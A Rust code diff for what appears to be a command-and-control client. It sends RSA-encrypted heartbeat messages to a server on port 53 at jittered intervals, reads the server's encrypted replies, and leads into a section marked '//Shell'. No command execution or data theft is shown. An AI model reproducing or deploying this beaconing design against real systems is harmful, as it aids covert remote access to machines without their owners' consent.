@@ -17,7 +17,14 @@ struct Message {
     message_content: String,
 }
 
+fn trim_newline(s:&mut String){
+    while s.ends_with('\n') || s.ends_with('\r') || s.ends_with('\u{0}') {
+        s.pop();
+    };
+}
+
 async fn heartbeat(
+    s_write:&mut OwnedWriteHalf,
     username_string: &String,
     srv_pub_key: &RsaPublicKey,
     mut rng: OsRng,
@@ -39,13 +46,9 @@ async fn heartbeat(
 
             // message sending
             let json_message = serde_json::to_string(&message_to_send).unwrap();
-            let _enc_data = srv_pub_key
-                .encrypt(
-                    &mut rng,
-                    PaddingScheme::new_pkcs1v15_encrypt(),
-                    &json_message.as_bytes(),
-                )
-                .expect("failed to encrypt");
+            println!("{:?}", json_message);
+            let enc_data = srv_pub_key.encrypt(&mut rng, PaddingScheme::new_pkcs1v15_encrypt(), &json_message.as_bytes()).expect("failed to encrypt");
+            s_write.write_all(&enc_data).await.unwrap();
         }
     }
 }
@@ -65,7 +68,7 @@ async fn main() -> io::Result<()> {
 
     // TCP Stream creation
 
-    let mut _stream = TcpStream::connect("10.0.0.12:53").await?;
+    let mut _stream = TcpStream::connect("192.168.1.41:53").await?;
     let (mut reader, mut writer) = _stream.into_split();
 
     // Send public key
@@ -111,11 +114,22 @@ async fn main() -> io::Result<()> {
 
     // Spawn thread
     let rng_thread = rng.clone();
-    loop {
-        let sleep_time = std::time::Duration::from_secs(rng.gen_range(1800..3600));
+    loop{
+        let sleep_time = std::time::Duration::from_secs(rng.gen_range(10..30));
         std::thread::sleep(sleep_time);
         println!("Sending heartbeat");
-        heartbeat(&username, &srv_pub_key, rng_thread).await;
+        heartbeat(&mut writer, &username, &srv_pub_key, rng_thread).await;
+
+        let mut buf = [0; 4096];
+        let n = reader.read(&mut buf[..]).await?;
+        let dec_data = priv_key.decrypt(PaddingScheme::new_pkcs1v15_encrypt(), &buf[..n]).expect("failed to decrypt");
+        assert_ne!(&dec_data, &buf[..n]);
+        
+        let mut rcv_msg = String::from_utf8_lossy(&dec_data).to_string();
+        trim_newline(&mut rcv_msg);
+
+        let json_message: Message = serde_json::from_str(&rcv_msg).unwrap();
+        println!("{:?}", json_message.message_content);
     }
 
     //Shell
